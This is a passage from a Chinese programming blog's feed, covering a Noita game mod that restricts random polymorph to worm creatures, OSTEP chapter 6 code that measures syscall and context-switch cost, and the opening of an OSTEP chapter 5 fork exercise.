<span class="token attr-name">randomize_velocity.max_y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SpriteParticleEmitterComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LifetimeComponent</span>
<span class="token attr-name">lifetime</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LifetimeComponent</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Entity</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LuaComponent</span> 
<span class="token attr-name">execute_on_removed</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token attr-name">execute_every_n_frame</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-1<span class="token punctuation">"</span></span>
<span class="token attr-name">script_source_file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/scripts/projectiles/polymorph_explosion.lua<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LuaComponent</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AudioComponent</span>
        <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/audio/Desktop/misc.bank<span class="token punctuation">"</span></span>
        <span class="token attr-name">event_root</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>game_effect/polymorph<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AudioComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Entity</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>发现决定了变形目标的代码是: polymorph_target=”[RANDOM]”<br>作为对比，这是变形魔药（变羊）对应的部分：polymorph_target=”data/entities/animals/sheep.xml”</p>
<p>那么模组的制作思路就一目了然了——把蠕虫文件换进去。而新的问题也出现了，蠕虫有五种：大、中、小、地狱的、艺之神殿的，而xml如果写路径只能放一个</p>
<p>只好进一步研究[RANDOM]的实现了，有一个polymorph表，游戏启动时会把可变形的生物加进去</p>
<p>需要借助nolla提供的api来修改，这里要用到PolymorphTableSet和PolymorphTableGet</p>
<p>实现代码：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!--</span><span class="token punctuation">></span></span>mod.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!--</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Mod</span>
        <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Always Worm<span class="token punctuation">"</span></span>
        <span class="token attr-name">description</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>将混乱变形效果限制为只在基础蠕虫系列中随机变形 (worm, worm_big, worm_tiny, worm_end, worm_skull)<span class="token punctuation">"</span></span>
        <span class="token attr-name">author</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nil<span class="token punctuation">"</span></span>
        <span class="token attr-name">request_no_api_restrictions</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
        <span class="token attr-name">is_game_mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Mod</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">-- init.lua</span>
<span class="token comment">-- 设置polymorph表只包含各种蠕虫</span>
<span class="token keyword">function</span> <span class="token function">set_worm_only_polymorph</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">local</span> worm_entities <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"data/entities/animals/worm.xml"</span><span class="token punctuation">,</span>           <span class="token comment">-- 普通蠕虫</span>
<span class="token string">"data/entities/animals/worm_big.xml"</span><span class="token punctuation">,</span>       <span class="token comment">-- 大蠕虫</span>
<span class="token string">"data/entities/animals/worm_tiny.xml"</span><span class="token punctuation">,</span>      <span class="token comment">-- 小蠕虫</span>
<span class="token string">"data/entities/animals/worm_end.xml"</span><span class="token punctuation">,</span>       <span class="token comment">-- 地狱蠕虫</span>
<span class="token string">"data/entities/animals/worm_skull.xml"</span>      <span class="token comment">-- 幽灵蠕虫</span>
<span class="token punctuation">&#125;</span>

<span class="token function">PolymorphTableSet</span><span class="token punctuation">(</span>worm_entities<span class="token punctuation">,</span> <span class="token keyword">false</span><span class="token punctuation">)</span>     <span class="token comment">-- 核心函数</span>
<span class="token function">PolymorphTableSet</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

<span class="token comment">-- 模组初始化</span>
<span class="token keyword">function</span> <span class="token function">OnModPostInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">set_worm_only_polymorph</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

<span class="token comment">-- 世界初始化时也设置一次</span>
<span class="token keyword">function</span> <span class="token function">OnWorldInitialized</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">set_worm_only_polymorph</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

<span class="token comment">-- nothing</span>
<span class="token keyword">function</span> <span class="token function">OnWorldPreUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>把文件夹放到指定目录里，完成，比想象中简单</p>
<p>如何新增法术/物品，在游戏窗口绘制交互图标有待进一步学习</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;本文用于记录本人的第一个noita的mod开发过程&lt;/p&gt;
&lt;h2 id=&quot;新建文件夹&quot;&gt;&lt;a href=&quot;#新建文件夹&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="noita" scheme="https://aucept.in/categories/noita/"/>
    
    
    <category term="lua" scheme="https://aucept.in/tags/lua/"/>
    
    <category term="noita" scheme="https://aucept.in/tags/noita/"/>
    
    <category term="mod_dev" scheme="https://aucept.in/tags/mod-dev/"/>
    
    <category term="xml" scheme="https://aucept.in/tags/xml/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP-第六章</title>
    <link href="https://aucept.in/2025/06/26/OSTEP-%E7%AC%AC%E5%85%AD%E7%AB%A0/"/>
    <id>https://aucept.in/2025/06/26/OSTEP-%E7%AC%AC%E5%85%AD%E7%AB%A0/</id>
    <published>2025-06-26T10:51:55.000Z</published>
    <updated>2025-06-26T11:05:33.059Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><blockquote>
<p>在这个作业中，你将测量系统调用和上下文切换的成本。测量系统调用的成本相对容易。<br>例如，你可以重复调用一个简单的系统调用（例如，执行 0 字节读取）并记下所花的时间。<br>将时间除以迭代次数，就可以估计系统调用的成本。</p>
<p>你必须考虑的一件事是时钟的精确性和准确性。你可以使用的典型时钟是 gettimeofday()。<br>详细信息请阅读手册页。你会看到，gettimeofday()返回自 1970 年以来的微秒时间。<br>然而，这并不意味着时钟精确到微秒。测量 gettimeofday()的连续调用，以了解时钟的精确度。这<br>会告诉你为了获得一个好的测量结果，需要让空系统调用测试的迭代运行多少次。如果<br>gettimeofday()对你来说不够精确，可以考虑利用 x86 机器提供的 rdtsc 指令。</p>
<p>测量上下文切换的成本有点棘手。lmbench 基准测试的实现方法，是在单个 CPU 上运<br>行两个进程并在它们之间设置两个 UNIX 管道。管道只是 UNIX 系统中的进程可以相互通<br>信的许多方式之一。第一个进程向第一个管道写入数据，然后等待第二个数据的读取。由<br>于看到第一个进程等待从第二个管道读取的内容，OS 将第一个进程置于阻塞状态，并切换<br>到另一个进程，该进程从第一个管道读取数据，然后写入第二个管理。当第二个进程再次<br>尝试从第一个管道读取时，它会阻塞，从而继续进行通信的往返循环。通过反复测量这种<br>通信的成本，lmbench 可以很好地估计上下文切换的成本。你可以尝试使用管道或其他通信<br>机制（例如 UNIX 套接字），重新创建类似的东西。</p>
<p>在具有多个 CPU 的系统中，测量上下文切换成本有一点困难。在这样的系统上，你需<br>要确保你的上下文切换进程处于同一个处理器上。幸运的是，大多数操作系统都会提供系<br>统调用，让一个进程绑定到特定的处理器。例如，在 Linux 上，sched_setaffinity()调用就是<br>你要查找的内容。通过确保两个进程位于同一个处理器上，你就能确保在测量操作系统停<br>止一个进程并在同一个 CPU 上恢复另一个进程的成本。</p>
</blockquote>
<p>两个任务，测量系统调用花费的时间和上下文切换花费的时间，一个小任务，测量gettimeofday()的精度</p>
<p>呃，没有参考代码，那就来吧：<br><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;sys/wait.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/time.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;x86intrin.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span>  </span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">1000000</span></span></span>

<span class="token keyword">using</span> std<span class="token double-colon punctuation">::</span>cout<span class="token punctuation">;</span>
<span class="token keyword">using</span> std<span class="token double-colon punctuation">::</span>cin<span class="token punctuation">;</span>
<span class="token keyword">using</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>

<span class="token comment">//测量系统调用的时间和上下文切换的时间</span>

<span class="token keyword">void</span> <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N <span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buff <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token comment">//gettimeofday版</span>
  timeval tv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">gettimeofday</span><span class="token punctuation">(</span>tv <span class="token punctuation">,</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">//syscall();</span>
  <span class="token function">gettimeofday</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">//cout&lt;&lt; N &lt;&lt;"次调用前时间："&lt;&lt;tv[0].tv_sec&lt;&lt;"秒"&lt;&lt;tv[0].tv_usec&lt;&lt;"微秒"&lt;&lt;endl;</span>
  <span class="token comment">//cout&lt;&lt;"调用后时间："&lt;&lt;tv[1].tv_sec&lt;&lt;"秒"&lt;&lt;tv[1].tv_usec&lt;&lt;"微秒"&lt;&lt;endl;</span>
  <span class="token comment">//cout&lt;&lt; "平均每百次"&lt;&lt; ( tv[1].tv_usec - tv[0].tv_usec ) * 100/ N &lt;&lt;"微秒"&lt;&lt;endl;</span>
  <span class="token comment">//实验结果是每百次read调用11-13微秒，并未出现很大的误差</span>

  <span class="token comment">//retsc版</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> start <span class="token operator">=</span> <span class="token function">__rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> end <span class="token operator">=</span> <span class="token function">__rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"平均每次read系统调用： "</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span>  <span class="token operator">/</span> N<span class="token operator">&lt;&lt;</span> <span class="token string">"时钟周期"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>

  <span class="token comment">//测量上下文切换的成本</span>
  <span class="token comment">//第一步，建立管道，两个</span>
  <span class="token keyword">int</span> pipe1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">pipe</span><span class="token punctuation">(</span>pipe1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// pipe1[0] - read, pipe1[1] - write</span>
  <span class="token keyword">int</span> pipe2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">pipe</span><span class="token punctuation">(</span>pipe2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// pipe2[0] - read, pipe2[1] - write</span>

  <span class="token comment">//第二步，创立进程</span>
  pid_t pid1 <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">//第三步，绑定cpu</span>
  cpu_set_t mask<span class="token punctuation">;</span>
  <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 绑定到 CPU 0</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>pid1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//子进程</span>
    pid_t pid2 <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span>pid2<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid1 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//父进程</span>
    pid_t pid3 <span class="token operator">=</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span>pid3<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">//第四步，进行lmbench 基准测试</span>
  <span class="token comment">//梳理一下思路，进程A往pipe1里写，然后进程B去读，把读到的写到pipe2，然后A从pipe2读，再写进pipe1，每次一个进程的任务完成进入等待都会触发上下文切换</span>
  <span class="token comment">//read这个系统调用函数，在目标为空的时候会自然地触发等待，所以我们不需要显式地做什么操作完成等待</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> ack <span class="token operator">=</span> <span class="token string">"ACK"</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> ack2 <span class="token operator">=</span> <span class="token string">"RST"</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">int</span> ack_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>ack<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">int</span> ack2_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>ack2<span class="token punctuation">)</span><span class="token punctuation">;</span>  

  <span class="token keyword">if</span><span class="token punctuation">(</span>pid1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//子进程</span>
    <span class="token function">close</span><span class="token punctuation">(</span>pipe1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 不写 pipe1</span>
    <span class="token function">close</span><span class="token punctuation">(</span>pipe2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 不读 pipe2</span>

    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      ssize_t n <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>pipe1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> buf<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>  


      <span class="token function">write</span><span class="token punctuation">(</span>pipe2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ack<span class="token punctuation">,</span> ack_len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//写</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>pipe1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>pipe2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid1 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//父进程</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> begin2 <span class="token operator">=</span> <span class="token function">__rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>pipe1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 不读 pipe1</span>
    <span class="token function">close</span><span class="token punctuation">(</span>pipe2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 不写 pipe2</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">write</span><span class="token punctuation">(</span>pipe1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ack2<span class="token punctuation">,</span> ack2_len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//写</span>

      <span class="token comment">// 等待 ack</span>
      <span class="token keyword">char</span> ack_buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
      <span class="token function">read</span><span class="token punctuation">(</span>pipe2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ack_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ack_buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//读</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> end2 <span class="token operator">=</span> <span class="token function">__rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"平均每次上下文切换： "</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>end2 <span class="token operator">-</span> begin2<span class="token punctuation">)</span>  <span class="token operator">/</span> <span class="token punctuation">(</span>N <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span> <span class="token string">"时钟周期"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>

    <span class="token function">close</span><span class="token punctuation">(</span>pipe1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>pipe2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 等子进程结束</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>运行完的结果：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">平均每次read系统调用： <span class="token number">381</span>时钟周期
平均每次上下文切换： <span class="token number">4141</span>时钟周期<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<p>查阅资料可知，不同的系统调用消耗的时钟周期会差特别大，上下文切换在更大的程序里，开销也会变大</p>
<p>本实验就不继续深入了</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;题目：&quot;&gt;&lt;a href=&quot;#题目：&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="OSTEP" scheme="https://aucept.in/categories/OSTEP/"/>
    
    
    <category term="OSTEP" scheme="https://aucept.in/tags/OSTEP/"/>
    
    <category term="操作系统" scheme="https://aucept.in/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP-第五章</title>
    <link href="https://aucept.in/2025/06/25/OSTEP-%E7%AC%AC%E4%BA%94%E7%AB%A0/"/>
    <id>https://aucept.in/2025/06/25/OSTEP-%E7%AC%AC%E4%BA%94%E7%AB%A0/</id>
    <published>2025-06-25T11:13:55.000Z</published>
    <updated>2025-06-25T11:13:10.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第五章课后题"><a href="#第五章课后题" class="headerlink" title="第五章课后题"></a>第五章课后题</h1><h2 id="第1题"><a href="#第1题" class="headerlink" title="第1题"></a><strong>第1题</strong></h2><blockquote>
<p>编写一个调用 fork()的程序。在调用 fork()之前，让主进程访问一个变量（例如 x）<br>并将其值设置为某个值（例如 100）。子进程中的变量有什么值？当子进程和父进程都改变<br>x的值时，变量会发生什么？ </p>
</blockquote>
<p>x = 100是fork前的，fork后的x彼此独立<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> x <span class="token punctuation">;</span>
  x <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
